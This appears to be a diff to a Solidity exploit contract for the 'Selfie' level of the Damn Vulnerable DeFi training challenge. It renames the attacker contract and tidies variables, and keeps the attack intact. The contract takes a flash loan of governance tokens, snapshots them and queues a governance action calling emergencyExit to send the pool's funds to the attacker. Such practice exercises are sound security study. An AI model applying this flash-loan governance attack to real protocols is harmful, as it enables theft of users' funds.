@@ -5,11 +5,11 @@ import "./SimpleGovernance.sol";
 import "./SelfiePool.sol";
 import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
-contract SelfieAttack is IERC3156FlashBorrower{
+contract SelfieAttacker is IERC3156FlashBorrower{
 
+    address public immutable attacker;
     SelfiePool public immutable pool;
     SimpleGovernance public immutable governance;
-    address public immutable attacker;
     bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
 
     constructor(address _pool) {
@@ -25,14 +25,19 @@ contract SelfieAttack is IERC3156FlashBorrower{
         uint256 fee,
         bytes calldata
     ) external returns (bytes32) {
-        bytes memory data = abi.encodeCall(pool.emergencyExit, attacker);
+        bytes memory emergencyExitCall = abi.encodeCall(pool.emergencyExit, attacker);
         DamnValuableTokenSnapshot(token).snapshot();
-        governance.queueAction(address(pool), 0, data);
+        governance.queueAction(address(pool), 0, emergencyExitCall);
         ERC20(token).approve(address(pool), amount + fee);
         return CALLBACK_SUCCESS;
     }
 
     function executeFlashLoan(uint256 amount) external {
-        pool.flashLoan(this, address(pool.token()), amount, bytes(""));
+        pool.flashLoan(
+            this, 
+            address(pool.token()), 
+            amount, 
+            bytes("")
+        );
     }
 }
